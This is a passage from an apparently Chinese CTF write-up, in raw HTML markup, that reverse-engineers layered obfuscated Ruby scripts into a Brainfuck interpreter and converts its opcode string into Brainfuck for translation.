&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lIIl&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lII11&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lI11I&lt;/span&gt;()$llll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$llll&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chr; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1IlI&lt;/span&gt;()send($llll&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, $llll&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,$llll&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;length&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;); &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一开始的 &lt;code&gt;eval&lt;/code&gt; 就是 &lt;code&gt;send&lt;/code&gt; 中调用的函数，可以分析出来后面的东西就是要用来执行的，因为这是解释性语言，直接输出就拿到源代码了&lt;/p&gt;
&lt;p&gt;和刚才进行同样的操作，拿到第三份脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;begin&lt;/span&gt; $_&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$$&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;$$;@_&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;$_;$-_&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;@_
$__&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;_{_&lt;span style=&#34;color:#f92672&#34;&gt;==[]||&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?$&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;:$_&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;$__&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;$_&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;$-_&lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;}
@__&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;_,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;__{_&lt;span style=&#34;color:#f92672&#34;&gt;==[]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;$.&lt;span style=&#34;color:#f92672&#34;&gt;]]]+&lt;/span&gt;@__&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;$_&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;$-_&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;}
$_____&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;_{@__&lt;span style=&#34;color:#f92672&#34;&gt;[[*&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;-&amp;gt;&lt;/span&gt;__{__&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;$.&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;}&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;}
@_____&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;_{@__&lt;span style=&#34;color:#f92672&#34;&gt;[[*&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;-&amp;gt;&lt;/span&gt;__{__&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;$-_&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;}&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;}
$______&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;_{___,______&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_____&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,@_____&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;_____&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$__&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;____&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{};__&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$.;(_&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;{
  ____&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;______&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]]=&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;(__&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;$_)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;_____ ?&lt;span style=&#34;color:#e6db74&#34;&gt;____&lt;/span&gt;:_&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;})&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;}
@______&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;_,__{_&lt;span style=&#34;color:#f92672&#34;&gt;=[*&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;]+[*&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;____&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$__&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;___&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{};__&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$.;(_____&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;{
  ___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;$.&lt;span style=&#34;color:#f92672&#34;&gt;]]=&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;$_&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;(__&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;$_)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;____ ?&lt;span style=&#34;color:#e6db74&#34;&gt;___&lt;/span&gt;:_____&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;})&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;}
$_______&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;_{$___&lt;span style=&#34;color:#f92672&#34;&gt;=[]&lt;/span&gt;;@___&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$__&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;__&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;____&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$.;$____,@____&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{},&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
(_____&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;{
  _&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;____&lt;span style=&#34;color:#f92672&#34;&gt;]==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;5&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?(&lt;/span&gt;@____&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;____):$.
  _&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;____&lt;span style=&#34;color:#f92672&#34;&gt;]==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;6&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?(&lt;/span&gt;$____&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;@____&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;$-_&lt;span style=&#34;color:#f92672&#34;&gt;]]=&lt;/span&gt;____;@____&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@____&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;$.&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;$.&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;@_&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;):$.
  (____&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;$_)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;@___&lt;span style=&#34;color:#e6db74&#34;&gt;?$&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:_____&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;})&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
$____&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$____&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;{}&lt;span style=&#34;color:#e6db74&#34;&gt;?{&lt;/span&gt;}&lt;span style=&#34;color:#e6db74&#34;&gt;:@______&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;$____,$______&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;$____&lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;
(______&lt;span style=&#34;color:#f92672&#34;&gt;=-&amp;gt;&lt;/span&gt;{_&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]==&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?(&lt;/span&gt;$___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;]||=&lt;/span&gt;$.;$___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;]+=&lt;/span&gt;$_)&lt;span style=&#34;color:#e6db74&#34;&gt;:_&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]==&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?(&lt;/span&gt;$___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;]||=&lt;/span&gt;$.;$___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;]-=&lt;/span&gt;$_)&lt;span style=&#34;color:#e6db74&#34;&gt;:_&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]==&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?(&lt;/span&gt;$___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;]||=&lt;/span&gt;$.;$___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;STDIN&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ord)&lt;span style=&#34;color:#e6db74&#34;&gt;:_&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]==&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;?(___&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;$_)&lt;span style=&#34;color:#e6db74&#34;&gt;:_&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]==&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;?(___&lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt;$_)&lt;span style=&#34;color:#e6db74&#34;&gt;:_&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]==&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;5&amp;#39;&lt;/span&gt;?(__&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;($___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;]||&lt;/span&gt;$.)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;$.?$____&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:__&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;:_&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]==&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;6&amp;#39;&lt;/span&gt;?(__&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;($___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;]||&lt;/span&gt;$.)&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;$.?$____&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:__&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;:_&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;__&lt;span style=&#34;color:#f92672&#34;&gt;]==&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?(&lt;/span&gt;$&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;$___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;___&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)):$.
(__&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;$_)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;@___&lt;span style=&#34;color:#e6db74&#34;&gt;?_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:______&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;})&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;}
$_______&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;33516351...44516644&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&lt;span style=&#34;color:#66d9ef&#34;&gt;rescue&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Exception&lt;/span&gt;;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#中间部分省略了&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这份脚本就很丑了，最后一长串的数字，让我自己来猜的话肯定会猜是一个虚拟机&lt;/p&gt;
&lt;p&gt;然后一大堆 &lt;code&gt;?&lt;/code&gt; 一看就是 &lt;code&gt;switch&lt;/code&gt; 语句，后来细看才发现全是三元运算符，但也是 &lt;code&gt;switch&lt;/code&gt; 的作用&lt;/p&gt;
&lt;p&gt;于是将指令部分翻译成 python（只是熟悉一点而已）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; _[tmp_2] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;:
    global_3[tmp_3] &lt;span style=&#34;color:#f92672&#34;&gt;||=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
    global_3[tmp_3] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; global_1
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; _[tmp_2] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;:
    global_3[tmp_3] &lt;span style=&#34;color:#f92672&#34;&gt;||=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
    global_3[tmp_3] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; global_1
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; _[tmp_2] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;:
    global_3[tmp_3] &lt;span style=&#34;color:#f92672&#34;&gt;||=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
    global_3[tmp_3] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; STDIN&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ord
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; _[tmp_2] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;:
    tmp_3 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; global_1
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; _[tmp_2] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;:
    tmp_3 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; global_1
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; _[tmp_2] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;5&amp;#39;&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (global_3[tmp_3] &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;:
        tmp_2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; global_4[tmp_2]
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; _[tmp_2] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;6&amp;#39;&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (global_3[tmp_3] &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;:
        tmp_2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; global_4[tmp_2]
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; _[tmp_2] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7&amp;#39;&lt;/span&gt;:
    global_0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(global_3[tmp_3]))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为是补题，所以提前知道是 brainfuck 语言，但还是尝试自己逆了一下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;tmp_3 是指针，操作3和4对应了指针+1 -1(&amp;gt;和&amp;lt;)&lt;/li&gt;
&lt;li&gt;global_3 是指针指向的字节，操作0和1对应了字节的+1 -1(+和-)&lt;/li&gt;
&lt;li&gt;操作2中含有获取输入，对应了获取输入操作(,)&lt;/li&gt;
&lt;li&gt;操作7中含有&amp;laquo;，怀疑是输出，对应了输出操作(.)&lt;/li&gt;
&lt;li&gt;5和6对应了跳转，猜测5是[，6是]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之后就可以找个脚本翻译 brainfuck 了&lt;/p&gt;
&lt;p&gt;我先用 python 将其转为了正常的 brainfuck 语言&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;finalop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;+-,&amp;gt;&amp;lt;[].&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; op: &lt;span style=&#34;color:#75715e&#34;&gt;# 那一串数字&lt;/span&gt;
    finalop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (base[int(c)])
print (finalop)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后找了个脚本，这是核心部分：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ((c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getc(in)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; EOF) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (c) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; 
                &lt;span style=&#34;color:#75715e&#34;&gt;// fprintf(out, &amp;#34;\t\t++c;\n&amp;#34;); 
